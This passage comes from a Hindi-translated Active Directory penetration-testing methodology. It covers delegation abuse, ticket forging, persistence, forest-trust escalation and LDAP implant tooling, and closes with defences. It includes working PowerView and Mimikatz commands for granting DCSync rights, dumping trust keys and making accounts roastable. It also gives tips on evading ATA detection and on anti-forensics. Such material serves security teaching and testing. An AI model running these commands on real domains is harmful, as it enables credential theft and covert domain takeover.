इसलिए, यदि कोई **Domain Admin** उस computer पर login करता है, तो आप उसका TGT dump करके [Pass the Ticket](pass-the-ticket.md) का उपयोग कर उसके रूप में impersonate कर सकेंगे।\
constrained delegation की वजह से आप यहाँ तक कि **automatically compromise a Print Server** कर सकते हैं (उम्मीद है वह DC नहीं होगा)।

{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

यदि किसी user या computer को "Constrained Delegation" की अनुमति है तो वह **impersonate any user to access some services in a computer** करने में सक्षम होगा।\
यदि आप इस user/computer का **hash compromise** कर लेते हैं तो आप किसी भी user (यहाँ तक कि domain admins) की impersonation करके कुछ services तक पहुंच प्राप्त कर सकेंगे।

{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

किसी remote computer के Active Directory object पर **WRITE** privilege होने से आपको **elevated privileges** के साथ code execution प्राप्त करने का रास्ता मिलता है:

{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Compromised user के पास कुछ domain objects पर **interesting privileges** हो सकते हैं जो आपको बाद में lateral movement/privilege **escalate** करने की अनुमति दे सकते हैं।

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

यदि domain के भीतर कोई **Spool service listening** मिली तो उसे नए credentials **acquire** करने और privileges **escalate** करने के लिए **abuse** किया जा सकता है।

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

यदि **other users** compromised मशीन पर **access** करते हैं, तो memory से credentials **gather** करना और यहाँ तक कि उनके processes में beacons **inject** करके उनका impersonate करना संभव है।\
अधिकतर users सिस्टम तक RDP के माध्यम से पहुँचते हैं, इसलिए यहाँ तीसरे पक्ष के RDP sessions पर कुछ attacks कैसे करने हैं:

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** domain-joined computers पर **local Administrator password** को manage करने की एक प्रणाली प्रदान करता है, यह सुनिश्चित करते हुए कि पासवर्ड **randomized**, unique, और अक्सर **changed** हों। ये passwords Active Directory में store होते हैं और पहुँच केवल authorized users को देने के लिए ACLs द्वारा नियंत्रित होती है। यदि इन passwords तक पहुँच के लिए पर्याप्त permissions मिल जाएँ, तो अन्य computers पर pivot करना संभव हो जाता है।

{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

कम्प्रोमाइज़्ड मशीन से **certificates gather** करना environment के भीतर privileges escalate करने का एक तरीका हो सकता है:

{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

यदि **vulnerable templates** configure किए गए हों तो उन्हें abuse करके privileges escalate किया जा सकता है:

{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

एक बार जब आपको **Domain Admin** या बेहतर **Enterprise Admin** privileges मिल जाते हैं, तो आप **domain database**: _ntds.dit_ को **dump** कर सकते हैं।

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

पहले चर्चा की गई कुछ techniques को persistence के लिए भी प्रयोग किया जा सकता है।\
उदाहरण के लिए आप:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** एक specific service के लिए एक वैध Ticket Granting Service (TGS) ticket बनाता है, जो कि किसी account के **NTLM hash** (उदाहरण के लिए, PC account का hash) का उपयोग करके बनता है। इस विधि का उपयोग service privileges तक पहुँचने के लिए किया जाता है।

{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** में attacker Active Directory (AD) environment में krbtgt account के **NTLM hash** तक पहुँच प्राप्त कर लेता है। यह account ख़ास है क्योंकि यह सभी **Ticket Granting Tickets (TGTs)** को sign करने के लिए उपयोग होता है, जो AD नेटवर्क में authenticate करने के लिए आवश्यक होते हैं।

एक बार attacker इस hash को प्राप्त कर लेता है, तो वह किसी भी account के लिए **TGTs** बना सकता है (Silver ticket attack जैसा व्यवहार)।

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

ये golden tickets की तरह होते हैं लेकिन इन्हें इस तरह forge किया जाता है कि ये सामान्य golden tickets detection mechanisms को **bypass** कर सकें।

{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

किसी account के **certificates** होना या उन्हें request कर पाने की क्षमता users के account में persist करने का एक बहुत अच्छा तरीका है (यहाँ तक कि user password बदलने पर भी):

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Certificates** का उपयोग करके domain के भीतर उच्च privileges के साथ persist करना भी संभव है:

{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory में **AdminSDHolder** object privileged groups (जैसे Domain Admins और Enterprise Admins) की security सुनिश्चित करने के लिए एक standard **Access Control List (ACL)** apply करता है ताकि unauthorized बदलाव रोके जा सकें। हालांकि, इस feature का दुरुपयोग किया जा सकता है; यदि attacker AdminSDHolder की ACL को modify करके एक सामान्य user को full access दे दे, तो उस user को सभी privileged groups पर व्यापक नियंत्रण मिल जाएगा। यह सुरक्षा उपाय, जिसे अनअधिकृत पहुँच रोकने के लिए डिज़ाइन किया गया है, अगर ठीक से monitored ना हो तो नुकसानदेह साबित हो सकता है।

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

हर **Domain Controller (DC)** के अंदर एक local administrator account मौजूद होता है। ऐसी मशीन पर admin अधिकार प्राप्त करके, local Administrator hash को **mimikatz** से extract किया जा सकता है। इसके बाद registry में बदलाव करके इस password का उपयोग सक्षम करना पड़ता है, जिससे local Administrator account तक remote access संभव हो जाता है।

{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

आप किसी user को कुछ specific domain objects पर कुछ **special permissions** दे सकते हैं जो उस user को भविष्य में privileges escalate करने की अनुमति देंगी।

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors** का उपयोग किसी object के ऊपर मौजूद **permissions** को **store** करने के लिए किया जाता है। यदि आप किसी object के security descriptor में सिर्फ एक छोटा सा बदलाव कर दें, तो आप उस object पर बिना किसी privileged group के सदस्य बने काफी दिलचस्प privileges प्राप्त कर सकते हैं।

{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary class को abuse करके short-lived principals/GPOs/DNS records बनाएं जिनमें `entryTTL`/`msDS-Entry-Time-To-Die` होता है; ये self-delete कर जाते हैं बिना tombstones छोड़े, LDAP साक्ष्यों को मिटा देते हैं जबकि orphan SIDs, broken `gPLink` references, या cached DNS responses छोड़ जाते हैं (उदाहरण: AdminSDHolder ACE pollution या malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

LSASS को memory में alter करके एक **universal password** स्थापित करें, जिससे सभी domain accounts तक पहुँच मिल सके।

{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
आप अपनी **own SSP** बना सकते हैं ताकि मशीन तक पहुँचने के लिए उपयोग किए गए **credentials** को **clear text** में capture किया जा सके।

{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

यह AD में एक नया Domain Controller register करता है और उसे specified objects पर attributes (SIDHistory, SPNs...) **push** करने के लिए उपयोग करता है **बिना** उन **modifications** के संबंध में कोई **logs** छोड़े। इसके लिए आपको DA privileges चाहिए और root domain के भीतर होना चाहिए।\
ध्यान दें कि यदि आप गलत data उपयोग करेंगे तो काफी बुरे logs दिखाई देंगे।

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

पहले हमने चर्चा की थी कि यदि आपके पास **enough permission to read LAPS passwords** हो तो कैसे privileges escalate किए जा सकते हैं। हालाँकि, इन passwords का उपयोग persistence बनाए रखने के लिए भी किया जा सकता है।\
देखें:

{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft **Forest** को security boundary के रूप में देखता है। इसका अर्थ है कि **एक single domain compromize होने पर पूरी Forest compromize हो सकती है**।

### Basic Information

एक [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) एक security mechanism है जो एक domain के user को दूसरे domain में resources तक पहुँचने की अनुमति देता है। यह दोनों domains के authentication systems के बीच एक linkage बनाता है, जिससे authentication verifications सहजता से flow कर सकें। जब domains trust सेटअप करते हैं, तो वे अपने Domain Controllers (DCs) के भीतर कुछ specific **keys** exchange और retain करते हैं, जो trust की integrity के लिए महत्वपूर्ण होते हैं।

एक सामान्य परिदृश्य में, यदि किसी user को किसी **trusted domain** में service access करना है, तो उसे पहले अपने domain के DC से एक special ticket जिसे **inter-realm TGT** कहते हैं, request करना होगा। यह TGT एक shared **key** के साथ encrypt होता है जो दोनों domains के बीच सहमति से बनाया गया है। user फिर इस TGT को **trusted domain** के DC को प्रस्तुत करता है ताकि उसे service ticket (TGS) मिल सके। trusted domain के DC द्वारा inter-realm TGT की successful validation के बाद, वह TGS जारी करता है और user को service access मिल जाता है।

**Steps**:

1. एक **client computer** Domain 1 में शुरू करता है और अपने **NTLM hash** का उपयोग करके अपने **Domain Controller (DC1)** से **Ticket Granting Ticket (TGT)** request करता है।
2. यदि client authenticate हो जाता है तो DC1 एक नया TGT issue करता है।
3. client फिर **Domain 2** में resources तक पहुँचने के लिए DC1 से एक **inter-realm TGT** request करता है।
4. inter-realm TGT उस **trust key** से encrypt होता है जो DC1 और DC2 के बीच two-way domain trust का हिस्सा होता है।
5. client inter-realm TGT लेकर **Domain 2's Domain Controller (DC2)** के पास जाता है।
6. DC2 shared trust key का उपयोग करके inter-realm TGT verify करता है और यदि valid हो तो client को Domain 2 के target server के लिए **Ticket Granting Service (TGS)** जारी करता है।
7. अंत में, client इस TGS को server को प्रस्तुत करता है, जो server के account hash से encrypt होता है, और Domain 2 में service तक पहुँच प्राप्त करता है।

### Different trusts

यह ध्यान देने योग्य है कि **a trust can be 1 way or 2 ways**। दो-तरफ़ा विकल्प में दोनों domains एक-दूसरे पर trust करते हैं, लेकिन **1 way** trust relation में एक domain **trusted** होगा और दूसरा **trusting** domain। ऐसे मामले में, **आप केवल trusted domain से trusting domain के अंदर resources तक पहुँच पाएंगे**।

यदि Domain A Domain B पर trust करता है, तो A trusting domain है और B trusted domain है। साथ ही, **Domain A** में यह एक **Outbound trust** होगा; और **Domain B** में यह एक **Inbound trust** होगा।

**Different trusting relationships**

- **Parent-Child Trusts**: यह same forest के भीतर एक सामान्य setup है, जहाँ एक child domain अपने parent domain के साथ स्वचालित रूप से एक two-way transitive trust रखता है। इसका अर्थ यह है कि authentication requests parent और child के बीच सहज रूप से flow कर सकती हैं।
- **Cross-link Trusts**: इन्हें "shortcut trusts" भी कहा जाता है, ये child domains के बीच स्थापित किए जाते हैं ताकि referral प्रक्रियाएँ तेज हो सकें। जटिल forests में authentication referrals को आमतौर पर forest root तक ऊपर और फिर target domain तक नीचे जाना पड़ता है। cross-links बनाकर यह यात्रा छोटा कर दी जाती है, जो भौगोलिक रूप से फैले वातावरण में विशेष रूप से उपयोगी है।
- **External Trusts**: ये अलग, unrelated domains के बीच सेटअप किए जाते हैं और मूलतः non-transitive होते हैं। [Microsoft के दस्तावेज़](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) के अनुसार, external trusts उन domains के resources तक पहुँचने के लिए उपयोगी होते हैं जो current forest के बाहर हों और जिनके साथ forest trust न हो। सुरक्षा को external trusts के साथ SID filtering के माध्यम से मजबूत किया जाता है।
- **Tree-root Trusts**: ये trusts forest root domain और किसी newly added tree root के बीच स्वचालित रूप से स्थापित होते हैं। यद्यपि आमतौर पर इनका सामना कम होता है, tree-root trusts forest में नए domain trees जोड़ने के लिए महत्वपूर्ण होते हैं, जिससे उन्हें एक unique domain name बनाए रखने और two-way transitivity सुनिश्चित करने में मदद मिलती है। अधिक जानकारी के लिए [Microsoft की गाइड](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) देखें।
- **Forest Trusts**: यह प्रकार दो forest root domains के बीच एक two-way transitive trust है, जो सुरक्षा उपायों को बढ़ाने के लिए SID filtering भी लागू करता है।
- **MIT Trusts**: ये non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains के साथ स्थापित किए जाते हैं। MIT trusts थोड़े विशेष होते हैं और उन पर्यावरणों के लिए होते हैं जिन्हें Windows पारिस्थितिकी तंत्र के बाहर Kerberos-based systems के साथ integration की आवश्यकता होती है।

#### Other differences in **trusting relationships**

- एक trust relationship **transitive** (A trusts B, B trusts C, तो A trusts C) या **non-transitive** भी हो सकती है।
- एक trust relationship **bidirectional trust** (दोनों एक-दूसरे पर trust करते हैं) या **one-way trust** (केवल एक ही दूसरे पर trust करता है) के रूप में सेटअप की जा सकती है।

### Attack Path

1. **Enumerate** the trusting relationships
2. जाँचें कि क्या कोई भी **security principal** (user/group/computer) के पास **other domain** के resources तक **access** है, शायद ACE entries या दूसरे domain के groups में होने के कारण। **relationships across domains** के लिए देखें (शायद trust इसी के लिए बनाया गया था)।
1. इस मामले में kerberoast भी एक विकल्प हो सकता है।
3. उन **accounts** को **compromise** करें जो domains के बीच **pivot** कर सकें।

Attackers के पास किसी दूसरे domain में resources तक पहुँचने के तीन मुख्य mechanisms होते हैं:

- **Local Group Membership**: principals को machines पर local groups में जोड़ा जा सकता है, जैसे किसी server पर “Administrators” group, जिससे उन्हें उस machine पर काफी नियंत्रण मिल जाता है।
- **Foreign Domain Group Membership**: principals foreign domain के groups के सदस्य भी हो सकते हैं। हालांकि, इस तरीके की प्रभावशीलता trust की प्रकृति और group के scope पर निर्भर करती है।
- **Access Control Lists (ACLs)**: principals को एक **ACL** में specify किया जा सकता है, विशेषकर **ACEs** के रूप में **DACL** में, जो उन्हें specific resources तक पहुँच देता है। ACLs, DACLs, और ACEs की mechanics में गहराई से जाने के लिए, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” एक अमूल्य संसाधन है।

### Find external users/groups with permissions

आप domain में foreign security principals खोजने के लिए **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** देख सकते हैं। ये external domain/forest से आने वाले user/group होंगे।

आप इसे **Bloodhound** में या powerview का उपयोग करके जाँच सकते हैं:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Domain trusts को enumerate करने के अन्य तरीके:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> यहाँ **2 trusted keys** हैं, एक _Child --> Parent_ के लिए और दूसरी _Parent_ --> _Child_ के लिए।\
> आप वर्तमान डोमेन द्वारा उपयोग किए जा रहे key को निम्न के साथ देख सकते हैं:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection का दुरुपयोग कर trust का इस्तेमाल करते हुए child/parent domain पर Enterprise admin के रूप में escalate करें:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

यह समझना महत्वपूर्ण है कि Configuration Naming Context (NC) का कैसे दुरुपयोग किया जा सकता है। Configuration NC Active Directory (AD) पर्यावरण में एक फॉरेस्ट भर के configuration डेटा के लिए एक केंद्रीय रिपॉजिटरी के रूप में कार्य करता है। यह डेटा फॉरेस्ट के हर Domain Controller (DC) पर replicate होता है, और writable DCs Configuration NC की एक writable copy बनाए रखते हैं। इसे exploit करने के लिए, किसी के पास **SYSTEM privileges on a DC** होना चाहिए, प्राथमिकता के साथ एक child DC।

**Link GPO to root DC site**

Configuration NC के Sites container में AD फॉरेस्ट के भीतर सभी domain-joined computers के sites की जानकारी शामिल होती है। किसी भी DC पर SYSTEM privileges के साथ ऑपरेट करके, attackers GPOs को root DC sites से link कर सकते हैं। यह क्रिया इन sites पर लागू की जा रही policies को manipulate करके root domain को संभावित रूप से compromise कर सकती है।

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

एक attack vector में domain के अंदर privileged gMSAs को target करना शामिल है। gMSAs के passwords की गणना के लिए आवश्यक KDS Root key Configuration NC में store होती है। किसी भी DC पर SYSTEM privileges होने पर, KDS Root key को एक्सेस करके फॉरेस्ट में किसी भी gMSA के लिए passwords compute करना संभव है।

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

यह विधि धैर्य मांगती है, नए privileged AD objects के बनने का इंतजार करना। SYSTEM privileges के साथ, एक attacker AD Schema को modify करके किसी भी user को सभी classes पर complete control दे सकता है। इससे नए बनाए गए AD objects पर unauthorized access और control हो सकता है।

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability का उद्देश्य Public Key Infrastructure (PKI) objects पर नियंत्रण प्राप्त करना है ताकि एक certificate template बनाया जा सके जो फॉरेस्ट के किसी भी user के रूप में authentication सक्षम करे। चूँकि PKI objects Configuration NC में रहते हैं, एक writable child DC का compromise करना ESC5 attacks को execute करने में सक्षम बनाता है।

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
इस परिदृश्य में **आपका डोमेन** एक बाहरी डोमेन द्वारा ट्रस्ट किया गया है, जो आपको उस पर **अनिर्धारित अनुमतियाँ** प्रदान करता है। आपको पता लगाना होगा कि **आपके डोमेन के कौन से प्रिंसिपल्स को बाहरी डोमेन पर किस प्रकार की पहुँच है** और फिर इसका दुरुपयोग करने की कोशिश करनी होगी:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### बाहरी फॉरेस्ट डोमेन - एकतरफा (आउटबाउंड)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In this scenario **your domain** is **trusting** some **privileges** to principal from a **different domains**.

However, when a **domain is trusted** by the trusting domain, the trusted domain **creates a user** with a **predictable name** that uses as **password the trusted password**. Which means that it's possible to **access a user from the trusting domain to get inside the trusted one** to enumerate it and try to escalate more privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Another way to compromise the trusted domain is to find a [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) created in the **opposite direction** of the domain trust (which isn't very common).

Another way to compromise the trusted domain is to wait in a machine where a **user from the trusted domain can access** to login via **RDP**. Then, the attacker could inject code in the RDP session process and **access the origin domain of the victim** from there.\
Moreover, if the **victim mounted his hard drive**, from the **RDP session** process the attacker could store **backdoors** in the **startup folder of the hard drive**. This technique is called **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- SID Filtering उन हमलों के जोखिम को कम करता है जो SID history attribute का उपयोग करते हुए forest trusts के पार होते हैं; SID Filtering सभी inter-forest trusts पर डिफ़ॉल्ट रूप से सक्रिय रहता है। यह इस धारणा पर आधारित है कि intra-forest trusts सुरक्षित हैं, और Microsoft की नीति के अनुसार forest को security boundary माना जाता है न कि domain को।
- हालाँकि, एक परेशानी यह है कि SID filtering कुछ applications और user access को बाधित कर सकता है, जिससे इसे कभी-कभी निष्क्रिय (deactivate) करना पड़ता है।

### **Selective Authentication:**

- inter-forest trusts के लिए Selective Authentication को लागू करने से यह सुनिश्चित होता है कि दोनों forests के users स्वतः authenticated न हों। इसके लिए users को trusting domain या forest के भीतर domains और servers तक पहुँचने के लिए explicit permissions की आवश्यकता होती है।
- यह ध्यान देना महत्वपूर्ण है कि ये उपाय writable Configuration Naming Context (NC) के शोषण या trust account पर होने वाले हमलों से सुरक्षा प्रदान नहीं करते।

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) bloodyAD-style LDAP primitives को x64 Beacon Object Files के रूप में re-implement करता है जो पूरी तरह एक on-host implant (उदा., Adaptix C2) के अंदर चलते हैं। Operators पैक को compile करते हैं `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, `ldap.axs` लोड करते हैं, और फिर beacon से `ldap <subcommand>` कॉल करते हैं। सभी ट्रैफ़िक current logon security context के अंतर्गत LDAP (389) पर signing/sealing या LDAPS (636) पर auto certificate trust के साथ चलता है, इसलिए कोई socks proxies या disk artifacts आवश्यक नहीं होते।

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, और `get-groupmembers` short names/OU paths को full DNs में resolve करके संबंधित objects को dump करते हैं।
- `get-object`, `get-attribute`, और `get-domaininfo` arbitrary attributes (including security descriptors) के साथ-साथ forest/domain metadata को `rootDSE` से खींचते हैं।
- `get-uac`, `get-spn`, `get-delegation`, और `get-rbcd` LDAP से सीधे roasting candidates, delegation settings, और मौजूदा [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors को उजागर करते हैं।
- `get-acl` और `get-writable --detailed` DACL को parse करके trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), और inheritance सूचीबद्ध करते हैं, जिससे ACL privilege escalation के तात्कालिक लक्ष्य मिलते हैं।
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) ऑपरेटर को नए principals या मशीन अकाउंट्स को उन OUs में स्टेज करने देते हैं जहाँ OU अधिकार मौजूद हैं। `add-groupmember`, `set-password`, `add-attribute`, और `set-attribute` सीधे लक्ष्यों को हाईजैक कर लेते हैं जब write-property अधिकार मिल जाते हैं।
- ACL-focused commands जैसे `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, और `add-dcsync` किसी भी AD object पर WriteDACL/WriteOwner को password resets, group membership control, या DCSync replication privileges में बदल देते हैं बिना PowerShell/ADSI artifacts छोड़े। `remove-*` समकक्ष इंजेक्ट किए गए ACEs को क्लीनअप करते हैं।

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` किसी compromised user को तुरंत Kerberoastable बना देते हैं; `add-asreproastable` (UAC toggle) इसे AS-REP roasting के लिए मार्क करता है बिना पासवर्ड को छुए।
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) `msDS-AllowedToDelegateTo`, UAC flags, या `msDS-AllowedToActOnBehalfOfOtherIdentity` को beacon से रीराइट कर देते हैं, जिससे constrained/unconstrained/RBCD attack paths सक्षम होते हैं और remote PowerShell या RSAT की आवश्यकता Eliminated हो जाती है।

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` नियंत्रित principal के SID history में privileged SIDs इंजेक्ट करता है (देखें [SID-History Injection](sid-history-injection.md)), जो LDAP/LDAPS के माध्यम से चोरी-छिपे access inheritance प्रदान करता है।
- `move-object` कंप्यूटरों या उपयोगकर्ताओं का DN/OU बदल देता है, जिससे attacker उन OUs में एसेट्स खींच सकता है जहाँ पहले से delegated अधिकार मौजूद हैं, और फिर `set-password`, `add-groupmember`, या `add-spn` का दुरुपयोग कर सकता है।
- Tightly scoped removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, आदि) ऑपरेटर को क्रेडेंशियल्स या persistence हार्वेस्ट करने के बाद तेज़ rollback की अनुमति देते हैं, जिससे टेलीमेट्री न्यूनतम रहती है।

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## कुछ सामान्य रक्षा उपाय

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **क्रेडेंशियल सुरक्षा के लिए रक्षात्मक उपाय**

- **Domain Admins Restrictions**: सिफारिश है कि Domain Admins को केवल Domain Controllers में लॉगिन की अनुमति दी जाए और उन्हें अन्य hosts पर उपयोग करने से बचा जाए।
- **Service Account Privileges**: Services को सुरक्षा बनाए रखने के लिए Domain Admin (DA) privileges के साथ नहीं चलाना चाहिए।
- **Temporal Privilege Limitation**: जिन कार्यों के लिए DA privileges चाहिए, उनकी अवधि सीमित रखनी चाहिए। इसे इस प्रकार प्राप्त किया जा सकता है: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit Event IDs 2889/3074/3075 की जाँच करें और फिर DCs/clients पर LDAP signing तथा LDAPS channel binding लागू करें ताकि LDAP MITM/relay प्रयासों को रोका जा सके।

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **डिसेप्शन तकनीकों को लागू करना**

- डिसेप्शन लागू करने में traps सेट करना शामिल है, जैसे decoy users या computers, जिनके पास ऐसे फीचर हों जैसे passwords that do not expire या जिन्हें Trusted for Delegation के रूप में मार्क किया गया हो। विस्तृत दृष्टिकोण में ऐसे users बनाना शामिल है जिनके पास विशिष्ट अधिकार हों या जिन्हें high privilege groups में जोड़ा गया हो।
- एक व्यावहारिक उदाहरण में ऐसे टूल्स का उपयोग शामिल है: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- डिसेप्शन तकनीकों को तैनात करने के बारे में अधिक जानकारी के लिए देखें [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **डिसेप्शन की पहचान करना**

- **For User Objects**: संदिग्ध संकेतों में असामान्य ObjectSID, कम बार लॉगऑन, निर्माण तिथियाँ, और कम bad password counts शामिल हैं।
- **General Indicators**: संभावित decoy objects के attributes की तुलना वास्तविक objects के साथ करने से असंगतियाँ उजागर हो सकती हैं। ऐसे टूल्स जैसे [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) सहायता कर सकते हैं।

### **डिटेक्शन सिस्टम्स को बायपास करना**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection से बचने के लिए Domain Controllers पर session enumeration से बचें।
- **Ticket Impersonation**: टिकट बनाने के लिए **aes** keys का उपयोग detection से बचने में मदद करता है क्योंकि यह NTLM पर डाउनग्रेड नहीं करता।
- **DCSync Attacks**: ATA detection से बचने के लिए non-Domain Controller से यह हमला चलाने की सलाह दी जाती है, क्योंकि सीधे Domain Controller से निष्पादन alerts ट्रिगर करेगा।

## संदर्भ

